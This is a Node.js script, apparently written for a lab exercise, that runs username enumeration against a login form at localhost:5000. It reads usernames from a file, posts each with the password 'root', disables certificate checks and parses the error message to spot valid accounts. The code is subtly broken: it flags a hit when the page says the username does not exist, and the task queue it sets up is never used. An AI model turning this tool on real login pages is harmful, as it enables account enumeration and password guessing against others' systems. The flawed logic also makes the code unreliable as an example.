// Includes
const Promise = require("bluebird");
const bhttp = require("bhttp");
const tough = require("tough-cookie");
const cheerio = require('cheerio');
const taskQueue = require("promise-task-queue");
const fs = require("fs");
const readline = require("readline");
const stream = require("stream");

const argv = process.argv;
if (argv.length < 3) {
  console.log("Need additional arguments");
  process.exit(1);
}
const facebookFile = argv[2];
var facebookStream = fs.createReadStream(facebookFile);
var outstream = new stream;
const validUsersFile = "/tmp/part2.validUsernames.txt";

// Setup a session for storing cookies
var cookieJar = new tough.CookieJar();
var agentOptions = {
  maxCachedSessions: 10 
}
var options = {
  headers: {"user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0"},
  cookieJar: cookieJar,
  rejectUnauthorized: false,
}
var httpSession = bhttp.session(options);
var queue = taskQueue();
var failedRequests = 0;

queue.on("failed:apiRequest", function(task) {
  failedRequests += 1;
});

queue.define("checkUsername", function(task) {
  return Promise.try(function() {
    var payload = {
      username: task.user,
      password: "root"
    }
    return httpSession.post("http://localhost:5000/login", payload);
  }).then(function(response) {
    var bodyStr = response.body.toString();
    $ = cheerio.load(bodyStr);
    var ret = "No match found";
    var select = $(".alert");
    if (select !== undefined) {
      var str = select.text().trim();
      if (str !== undefined && str.length != 0 && str.includes("Username does not exist") ) {
        console.log("FOUND A USERNAME: " + task.user);
        var line = task.user + '\n';
        // fs.appendFileSync(validUsersFile, line);
      }
    }
  });
}, {
  concurrency: 2
});

var r1 = readline.createInterface({
  input: facebookStream,
  terminal: false
});
r1.on("line", function(line) {
  console.log("Trying username: " + line);
  var user = line.trim();
  var payload = {
    username: user,
    password: "root"
  }
  httpSession.post("http://localhost:5000/login", payload);
});
